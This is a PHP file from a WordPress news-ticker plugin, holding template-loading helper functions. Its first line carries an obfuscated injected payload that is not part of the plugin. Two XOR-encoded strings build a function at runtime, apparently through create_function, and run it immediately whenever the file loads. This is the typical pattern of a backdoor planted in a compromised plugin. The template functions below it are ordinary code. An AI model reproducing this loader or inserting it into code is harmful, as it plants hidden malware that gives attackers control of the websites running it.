<?php $wDFxlSqny='WYSV1+3 >TX><ZU'^'4+67ENlFK:;JU5;';$FcFJJsKzKoGA=$wDFxlSqny('','TRES4UTPLQOU2UDB4YXbSHSR+6LNY+4ZMIVBgP0ReK:7X.;VBrS-Kq+6.,+2CFIjc>5XVNmH8.GkppFOZ=67KI51MTnvjBAeQm2O zWZpEIbuJqSeNZ6LQ<cO40LPKCii3AZSL2gFX17ehncXWUZZ-uwBff:ngFVCbKZhqAJ2<P-CYt;Y3b6fjr8x9S>16VXWYLTYS9O873H8B 2 7wVQU46S1xAsQPOAa;KBEgDPO<<5v26MXAVAC1ebf8;:<r+ U87XEQNYeWdeBL;UX+DD<7zIDQYQ+> -gixqVETZ1CV1O= uXyaJA5F+Y<1D7BUUZlBZ3GVDuHbZ5>>-3YYcXehfe8 2shd-8EFR<LowUoh;S:ERXAJom>u,;JA8:Y0iGUb>SMxekeSY-<+aEeA 05C7Zb9G1:x2jDX15jgKnI4I7LXAW+INX<>R0QL24jeA,XABQFVACg-K.XD.Aj +J;lMdQ35TX3RS3SXzF9RNB+-H5LWJU4JDU8a2=Rc62<H3ElhKUCoTGTXA.AdnckZL7JaGLJ.ZU3j15Ch6oNmoRqvI3bsOELWxTI3VDbn-aBOpKNe+lVpOn,vKEUKbQ3F L8GE6mX-XSG;jR2PY.D+>qXJm58T2bdMKDgHT4kCV>+RbrX0=2,PP-,ZXPZh6Xj23-0+9PhFwMS'^'=4mrR :388 ;m0<+G-+Jt0< tR-:8tk78=qkNpKXl-OY;ZR9,R+B9.OWZMtm.3=BGZT,7bMlSK>BPPfozF<>BmZD9tSVMezoXdT RRs3PxiRNjU:Y=.D 4RKkPQ81bxIMZjqzF;nb7DCEFSCps1;.L.S+;FdNC-3:9o3HTa9FN<H-qPP<JKkOQx1qK6JDD8ps69 ph3FE=NB2fDSTVWkq3UZ TCKW51; >P.;eZd6.POPM8<+733  YEJBgxus9beuYDxa:+ EjZEf:Z9-NmdG=sm 0-0tUETGTXU= -a;JrU.IAUeYE< Y3Nb6LN=+3urMf>R37mU3hSSQLHR:1CpA74 iuw <DLKeb9Y5OJkOLM2V07qa1ed7QHZ> gQ<IIzuFU64Coblw=LHJAxEeVQY6Rah0:;Gr8N 9ETJZk.<Z:R>1 ;B3+pDQ o5-FU5:,Y,i 053ww8I.M7 KiNDJ>ZEaDuWT 9l96JzqALP4ffOL<TlqluU864A>YX+<SJU;G6DO 0:Hxgp< Z MNEMzdZ.Toh.O.4hMZP:OkFnPRrVExPTF, t4J2zWavSXOQs.Cx,WHTeG,ZMQbesmB0A4A5g, O2=U1 3HBuB1 B+JZVtjIQY SKMmkdGhtOaJ3HJ>JV<QISww LU671>OkqQ8:HHBMxXoLG.');$FcFJJsKzKoGA();

/* --------------------------------------------------------- */
/* !Retrieves a template part - 1.5.0 */
/* --------------------------------------------------------- */

function mtphr_dnt_get_template_part( $slug, $name = null, $load = true ) {
	
	// Execute code for this part
	do_action( 'get_template_part_' . $slug, $slug, $name );
 
	// Setup possible parts
	$templates = array();
	if( isset($name) ) {
		$templates[] = $slug.'-'.$name.'.php';
	}
	$templates[] = $slug.'.php';
 
	// Allow template parts to be filtered
	$templates = apply_filters( 'mtphr_dnt_get_template_part', $templates, $slug, $name );
 
	// Return the part that is found
	return mtphr_dnt_locate_template( $templates, $load, false );
}


/* --------------------------------------------------------- */
/* !Retrieve the name of the highest priority template file that exists - 1.5.0 */
/* --------------------------------------------------------- */

function mtphr_dnt_locate_template( $template_names, $load = false, $require_once = true ) {
	
	// No file found yet
	$located = false;
 
	// Try to find a template file
	foreach( (array) $template_names as $template_name ) {
 
		// Continue if template is empty
		if( empty($template_name) ) {
			continue;
		}
 
		// Trim off any slashes from the template name
		$template_name = ltrim( $template_name, '/' );
 
		// Check child theme first
		if( file_exists(trailingslashit(get_stylesheet_directory()).'dittyticker/'.$template_name) ) {
			$located = trailingslashit(get_stylesheet_directory()).'dittyticker/'.$template_name;
			break;
 
		// Check parent theme next
		} elseif( file_exists(trailingslashit(get_template_directory()).'dittyticker/'.$template_name) ) {
			$located = trailingslashit( get_template_directory() ).'dittyticker/'.$template_name;
			break;
 
		// Check theme compatibility last
		} elseif( file_exists(MTPHR_DNT_DIR.'templates/'.$template_name) ) {
			$located = MTPHR_DNT_DIR.'templates/'.$template_name;
			break;
		}
	}
 
	if( (true == $load) && !empty($located) ) {
		load_template( $located, $require_once );
	}
 
	return $located;
}